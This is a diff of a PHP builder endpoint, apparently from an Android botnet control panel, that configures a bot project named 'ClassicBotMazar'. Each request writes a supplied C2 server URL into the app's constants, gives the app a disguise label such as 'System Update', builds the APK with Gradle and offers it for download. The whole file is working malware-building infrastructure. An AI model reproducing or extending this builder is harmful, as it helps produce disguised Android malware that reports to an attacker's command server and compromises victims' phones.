@@ -1,97 +1,58 @@
 <?php
-// Increase execution time for Gradle build
-ini_set('max_execution_time', 600);
-set_time_limit(600); 
-
+ini_set('max_execution_time', 900);
+set_time_limit(900);
 header('Content-Type: application/json');
 
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
-    exit;
-}
-
-// Flush output early to let PHP continue working in the background if needed
-// (Though we want the final JSON, we can't really stream it easily with exec)
-
 $input = json_decode(file_get_contents('php://input'), true);
-$apkName = $input['apkName'] ?? 'ClassicBotMazar';
-$appLabel = $input['appLabel'] ?? 'System Update';
+$apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $input['apkName'] ?? 'Bot');
+$appLabel = $input['appLabel'] ?? 'System';
 $c2Url = $input['c2Url'] ?? '';
 
-if (empty($c2Url)) {
-    echo json_encode(['success' => false, 'message' => 'C2 URL is required']);
+if (!$c2Url) {
+    echo json_encode(['success' => false, 'message' => 'C2 URL is empty']);
     exit;
 }
 
-// Update Constants.kt with the new C2 URL
-$constantsPath = __DIR__ . '/../../../app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
-if (file_exists($constantsPath)) {
-    $content = file_get_contents($constantsPath);
-    $content = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $content);
-    file_put_contents($constantsPath, $content);
+$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+$baseDir = realpath(__DIR__ . '/../../../');
+
+// Update Constants
+$constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
+if (file_exists($constFile)) {
+    $c = file_get_contents($constFile);
+    $c = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
+    file_put_contents($constFile, $c);
 }
 
-// Update strings.xml with the new app label
-$stringsPath = __DIR__ . '/../../../app/src/main/res/values/strings.xml';
-if (file_exists($stringsPath)) {
-    $content = file_get_contents($stringsPath);
-    $content = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . $appLabel . '</string>', $content);
-    file_put_contents($stringsPath, $content);
+// Update Strings
+$strFile = $baseDir . '/app/src/main/res/values/strings.xml';
+if (file_exists($strFile)) {
+    $s = file_get_contents($strFile);
+    $s = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
+    file_put_contents($strFile, $s);
 }
-
-// Determine if we are on Windows or Linux
-$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
 
 $output = [];
-$returnVar = 0;
+$status = 0;
 
-$rootPath = realpath(__DIR__ . '/../../../');
-
-if ($isWindows) {
-    // Windows build - use start /b to keep it background but capture output
-    // Actually, exec normally waits. The issue might be cmd buffering.
-    $command = 'cd /d ' . escapeshellarg($rootPath) . ' && call gradlew.bat assembleDebug 2>&1';
+if ($isWin) {
+    // Windows: Check for java in PATH and use call gradlew
+    $cmd = 'cd /d ' . escapeshellarg($baseDir) . ' && call gradlew.bat assembleDebug 2>&1';
 } else {
-    // Linux/Replit build
-    $javaPath = shell_exec('which java');
-    $javaHomeCmd = '';
-    if ($javaPath) {
-        $realJavaPath = realpath(trim($javaPath));
-        $javaHome = dirname(dirname($realJavaPath));
-        $javaHomeCmd = "export JAVA_HOME=$javaHome; ";
-    }
-    $command = $javaHomeCmd . 'cd ' . escapeshellarg($rootPath) . ' && chmod +x gradlew && ./gradlew assembleDebug 2>&1';
+    // Linux
+    $cmd = 'cd ' . escapeshellarg($baseDir) . ' && chmod +x gradlew && ./gradlew assembleDebug 2>&1';
 }
 
-// Execute the command
-exec($command, $output, $returnVar);
+exec($cmd, $output, $status);
 
-// Log to a temporary file for debugging
-file_put_contents(__DIR__ . '/build_last_log.txt', implode("\n", $output));
-
-if ($returnVar === 0) {
-    $apkPath = 'app/build/outputs/apk/debug/app-debug.apk';
-    $newApkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $apkName);
-    if (empty($newApkName)) $newApkName = 'app';
-    
-    $fullApkSource = $rootPath . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $apkPath);
-    $fullApkDest = __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . $newApkName . '.apk';
-    
-    if (file_exists($fullApkSource)) {
-        if (copy($fullApkSource, $fullApkDest)) {
-            echo json_encode([
-                'success' => true, 
-                'message' => 'Build successful', 
-                'downloadUrl' => $newApkName . '.apk',
-                'log' => implode("\n", $output)
-            ]);
-        } else {
-            echo json_encode(['success' => false, 'message' => 'Failed to copy APK to panel directory', 'log' => implode("\n", $output)]);
-        }
+if ($status === 0) {
+    $src = $baseDir . '/app/build/outputs/apk/debug/app-debug.apk';
+    $dest = __DIR__ . '/../' . $apkName . '.apk';
+    if (file_exists($src) && copy($src, $dest)) {
+        echo json_encode(['success' => true, 'downloadUrl' => $apkName . '.apk', 'log' => implode("\n", $output)]);
     } else {
-        echo json_encode(['success' => false, 'message' => 'APK file not found after build. Check build log.', 'log' => implode("\n", $output)]);
+        echo json_encode(['success' => false, 'message' => 'Copy failed', 'log' => implode("\n", $output)]);
     }
 } else {
-    echo json_encode(['success' => false, 'message' => 'Build failed with exit code ' . $returnVar, 'log' => implode("\n", $output)]);
+    echo json_encode(['success' => false, 'message' => 'Build error', 'log' => implode("\n", $output)]);
 }
